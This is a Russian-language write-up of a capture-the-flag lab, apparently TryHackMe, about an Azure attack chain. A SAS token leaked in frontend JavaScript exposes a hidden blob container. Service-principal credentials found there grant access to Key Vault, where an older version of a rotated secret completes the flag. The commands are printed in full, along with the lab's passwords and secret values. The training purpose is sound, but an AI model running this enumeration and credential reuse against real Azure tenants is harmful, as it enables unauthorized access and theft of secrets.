**Теги:** Cloud, Azure, Storage, Vault.
**Сложность:** Medium.

## 1. Начало работы

Таргет комнаты:

```text
https://cryptocabanaf5scjagc.z13.web.core.windows.net/
```

Комната предлагает работать с Azure. В начале предлагается установить Azure CLI:

```bash
curl -fsSL 'https://azurecliprod.blob.core.windows.net/$root/deb_install.sh' | sudo bash
```

После установки проверяем версию:

```bash
az --version
```

Получаем:

```text
azure-cli                         2.89.0
core                              2.89.0
telemetry                          1.1.0

Dependencies:
msal                              1.36.0
azure-mgmt-resource               24.0.0

Python location '/opt/az/bin/python3'
Config directory '/home/deb88/.azure'
Extensions directory '/home/deb88/.azure/cliextensions'

Python (Linux) 3.14.6 (main, Jul 28 2026, 12:41:02) [GCC 12.2.0]
```

Однако впоследствии выясняется, что локальный Azure CLI для решения фактически не нужен, поскольку основная работа выполняется через **Azure Cloud Shell** в браузере.

---

# 2. Azure Cloud Shell

Нам выдают учётные данные на 1 час:

```text
Username: usr-08067397@thmctf.onmicrosoft.com
Password: +*3V4CKS
```

После входа открываем Azure Cloud Shell:

```text
Requesting a Cloud Shell.Succeeded.
Connecting terminal...

Welcome to Azure Cloud Shell

Type "az" to use Azure CLI
Type "help" to learn about Cloud Shell

Your Cloud Shell session will be ephemeral so no files or system changes will persist beyond your current session.

usr-08067397 [ ~ ]$
```

Проверяем текущую Azure subscription:

```bash
az account show
```

Получаем:

```json
{
  "environmentName": "AzureCloud",
  "homeTenantId": "8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c",
  "id": "2492269a-2948-46fd-aae3-68c9b066443a",
  "isDefault": true,
  "managedByTenants": [],
  "name": "Az-Subs-CTF",
  "state": "Enabled",
  "tenantId": "8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c",
  "user": {
    "cloudShellID": true,
    "name": "usr-08067397@thmctf.onmicrosoft.com",
    "type": "user"
  }
}
```

Таким образом, имеем доступ к subscription:

```text
Az-Subs-CTF
```

---

# 3. Анализ frontend

Важная часть комнаты находится непосредственно в JavaScript-коде главной страницы.

В `app.js` обнаруживаем:

```javascript
const STORAGE_ACCOUNT = "cryptocabanaf5scjagc";
const BACKUPS_CONTAINER = "backups";
const BACKUP_SAS = "?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D";
```

Функция резервного копирования формирует URL непосредственно к Azure Blob Storage:

```javascript
function backupPhrase() {
  const phrase = document.getElementById("phrase").value.trim();
  const status = document.getElementById("status");

  if (!phrase) {
    status.textContent = "Enter a phrase first.";
    return;
  }

  const blobName = "backup-" + Date.now() + ".txt";
  const url =
    "https://" + STORAGE_ACCOUNT + ".blob.core.windows.net/" +
    BACKUPS_CONTAINER + "/" + blobName + "?" + BACKUP_SAS;

  fetch(url, {
    method: "PUT",
    headers: { "x-ms-blob-type": "BlockBlob" },
    body: phrase,
  })
    .then((res) => {
      status.textContent = res.ok
        ? "Backed up. Sleep easy."
        : "Backup failed (" + res.status + ").";
    })
    .catch(() => {
      status.textContent = "Backup failed — network error.";
    });
}
```

Здесь сразу можно выделить:

```text
Storage Account: cryptocabanaf5scjagc
Container: backups
SAS token: присутствует непосредственно в frontend
```

---

# 4. Использование SAS-токена

Полученный SAS позволяет обращаться к Blob Storage.

Проверяем контейнер `backups`:

```text
https://cryptocabanaf5scjagc.blob.core.windows.net/backups?restype=container&comp=list&sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D
```

Получаем:

```xml
<EnumerationResults ServiceEndpoint="https://cryptocabanaf5scjagc.blob.core.windows.net/" ContainerName="backups">
  <Blobs/>
  <NextMarker/>
</EnumerationResults>
```

Контейнер `backups` пуст.

---

# 5. Перечисление ресурсов Azure

Проверяем доступные ресурсы из Cloud Shell:

```bash
az resource list -o table
```

Затем:

```bash
az storage account list -o table
```

И:

```bash
az group list -o table
```

Получаем:

```text
Name                Location    Status
------------------  ----------  ---------
rg-cloudshell-only  centralus   Succeeded
```

На первый взгляд в subscription практически ничего интересного нет.

Далее перечисляем зарегистрированные Azure AD applications:

```bash
az ad app list --all --output table
```

Получаем:

```text
DisplayName                     Id                                    AppId                                 CreatedDateTime
------------------------------  ------------------------------------  ------------------------------------  --------------------
attacker-app-day9               bf4d873f-d24b-426b-94d5-761ee943f743  d92b4c7a-f523-4f3c-b808-bc3886e4420d  2026-08-04T16:39:52Z
cryptocabana-backup-automation  3c76ca15-8452-475e-98cf-5d1a3773d5ad  dbcf2923-e4eb-4b72-a0a4-688aa1185cf5  2026-07-19T15:17:11Z
sp-ch2-student                  35f2cf5f-071f-41f3-ba0c-ccc7a688aed  f4b35c22-fe24-478c-a721-ef12f7b7c15b  2026-04-13T19:57:29Z
thm-range-collector-pilot       a9c1efc4-3329-4186-8b10-0f9d1d3d5c45  b83d1315-dd2c-4d2e-994b-5eb463dd7e45  2026-06-01T18:26:18Z
thm-range-provisioner-pilot     be4317cf-6a32-4929-8af7-18e3ea0d4352  55bf75ab-2c7d-4829-93e2-d6100ad5ec38  2026-06-01T18:25:39Z
```

Наиболее интересное приложение:

```text
cryptocabana-backup-automation
```

---

# 6. Анализ Service Principal

Смотрим конфигурацию приложения:

```bash
az ad app show --id dbcf2923-e4eb-4b72-a0a4-688aa1185cf5
```

В результате обнаруживаем password credential:

```json
"passwordCredentials": [
  {
    "displayName": "backup-automation-secret",
    "endDateTime": "2028-07-19T15:17:23.7751282Z",
    "hint": "UBX",
    "keyId": "a71cab71-e96c-4534-8f46-60c0bf12c63d",
    "secretText": null,
    "startDateTime": "2026-07-19T15:17:23.7751282Z"
  }
]
```

Сам `secretText` через `az ad app show` не раскрывается.

Далее получаем Service Principal:

```bash
az ad sp list --filter "displayName eq 'cryptocabana-backup-automation'" -o json
```

Основные данные:

```text
appDisplayName:
cryptocabana-backup-automation

appId:
dbcf2923-e4eb-4b72-a0a4-688aa1185cf5

id:
852d18bd-f951-4f8a-a0ed-ce3788609245
```

---

# 7. Возвращаемся к Blob Storage

Поскольку SAS позволяет перечислять контейнеры storage account, проверяем уже не только `backups`, а весь Storage Account:

```bash
curl "https://cryptocabanaf5scjagc.blob.core.windows.net/?comp=list&sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D"
```

В ответе обнаруживаем три контейнера:

```xml
<Container><Name>$web</Name></Container>
<Container><Name>backups</Name></Container>
<Container><Name>vault</Name></Container>
```

Особенно интересен:

```text
vault
```

То есть через SAS, который frontend раскрывает пользователю, можно обнаружить скрытый контейнер.

---

# 8. Перечисление `vault`

Теперь обращаемся непосредственно к контейнеру `vault`:

```bash
curl "https://cryptocabanaf5scjagc.blob.core.windows.net/vault?restype=container&comp=list&sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D"
```

Получаем два объекта:

```text
backup-service-account.json
seed_phrase.txt
```

Особенно интересен:

```text
backup-service-account.json
```

Размер:

```text
360 bytes
```

и:

```text
seed_phrase.txt
```

размером:

```text
88 bytes
```

Получается следующая цепочка:

```text
Public website
      │
      ▼
app.js
      │
      ▼
SAS token
      │
      ▼
Storage Account
      │
      ▼
vault
      │
      ├── backup-service-account.json
      │
      └── seed_phrase.txt
```

---

# 9. Получение credentials Service Principal

Из `backup-service-account.json` получаем credentials сервисного аккаунта.

Используем их для входа в Azure:

```bash
az logout
```

После выхода:

```bash
az login --service-principal \
-u dbcf2923-e4eb-4b72-a0a4-688aa1185cf5 \
-p 'UBX8Q~xM6vawWZ5u2C-VhLlsB2Cx2dAuxcrAlbRg' \
--tenant 8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c
```

Azure подтверждает успешную авторизацию:

```json
[
  {
    "cloudName": "AzureCloud",
    "homeTenantId": "8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c",
    "id": "2492269a-2948-46fd-aae3-68c9b066443a",
    "isDefault": true,
    "managedByTenants": [],
    "name": "Az-Subs-CTF",
    "state": "Enabled",
    "tenantId": "8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c",
    "user": {
      "name": "dbcf2923-e4eb-4b72-a0a4-688aa1185cf5",
      "type": "servicePrincipal"
    }
  }
]
```

Проверяем:

```bash
az account show
```

Теперь текущий пользователь — Service Principal:

```text
name:
dbcf2923-e4eb-4b72-a0a4-688aa1185cf5

type:
servicePrincipal
```

---

# 10. Поиск Key Vault

С полученными правами перечисляем secrets в Key Vault:

```bash
az keyvault secret list \
--id https://ccabana-kv-f5scjagc.vault.azure.net/
```

Обнаруживаем:

```text
key-shard-1
key-shard-2
key-shard-3
master-key
```

Особенно интересны три `key-shard`:

```text
key-shard-1
key-shard-2
key-shard-3
```

а также:

```text
master-key
```

---

# 11. Получение значений secrets

Для получения значений выполняем:

```bash
for s in key-shard-1 key-shard-2 key-shard-3 master-key; do
echo "===== $s ====="
az keyvault secret show \
--id "https://ccabana-kv-f5scjagc.vault.azure.net/secrets/$s" \
--query value -o tsv
done
```

Получаем:

```text
===== key-shard-1 =====
THM{n0t_ur

===== key-shard-2 =====
Rotated this after IT flagged it -- old value should still be recoverable if you know where to look.

===== key-shard-3 =====
ur_c01ns!}

===== master-key =====
(Forbidden) Caller is not authorized to perform action on resource.
```

---

# 12. Сборка неполного флага

Первые и третьи части дают:

```text
key-shard-1:
THM{n0t_ur
```

и:

```text
key-shard-3:
ur_c01ns!}
```

Если соединить их:

```text
THM{n0t_urur_c01ns!}
```

Получается очевидно неправильная строка.

При этом `key-shard-2` сообщает:

```text
Rotated this after IT flagged it -- old value should still be recoverable if you know where to look.
```

Это явная подсказка на **старую версию secret**.

---

# 13. Поиск старых версий `key-shard-2`

Используем:

```bash
az keyvault secret list-versions \
--id https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-2 \
-o json
```

Получаем две версии:

```text
3d6492d2c6f74123bc754a9ded22b2a0
```

и:

```text
c922c422ffb34671a902389c372314f1
```

Одна из них является текущей, другая — старой.

---

# 14. Получение старого значения

Запрашиваем старую версию:

```bash
az keyvault secret show \
--id "https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-2/3d6492d2c6f74123bc754a9ded22b2a0" \
--query value -o tsv
```

Получаем:

```text
_k3ys_n0t_
```

Это недостающая часть.

Теперь объединяем три фрагмента:

```text
key-shard-1:
THM{n0t_ur

key-shard-2 (старое значение):
_k3ys_n0t_

key-shard-3:
ur_c01ns!}
```

Получаем:

```text
THM{n0t_ur_k3ys_n0t_ur_c01ns!}
```
---

# Итоговая цепочка

```text
Frontend
   │
   ▼
app.js
   │
   ▼
SAS token
   │
   ▼
Azure Blob Storage
   │
   ▼
Скрытый контейнер vault
   │
   ├── backup-service-account.json
   │
   ▼
Service Principal
   │
   ▼
Azure Key Vault
   │
   ├── key-shard-1
   ├── key-shard-2
   ├── key-shard-3
   └── master-key
          │
          ▼
   key-shard-2 имеет старые версии
          │
          ▼
   получение старого значения
          │
          ▼
      сборка флага
          │
          ▼
THM{n0t_ur_k3ys_n0t_ur_c01ns!}
```

## Flag

```text
THM{n0t_ur_k3ys_n0t_ur_c01ns!}
```

Главная идея комнаты — **утечка SAS-токена во frontend → доступ к Azure Blob Storage → обнаружение скрытого `vault` → извлечение Service Principal credentials → доступ к Key Vault → поиск старой версии ротированного secret → сборка флага из нескольких key shards**.
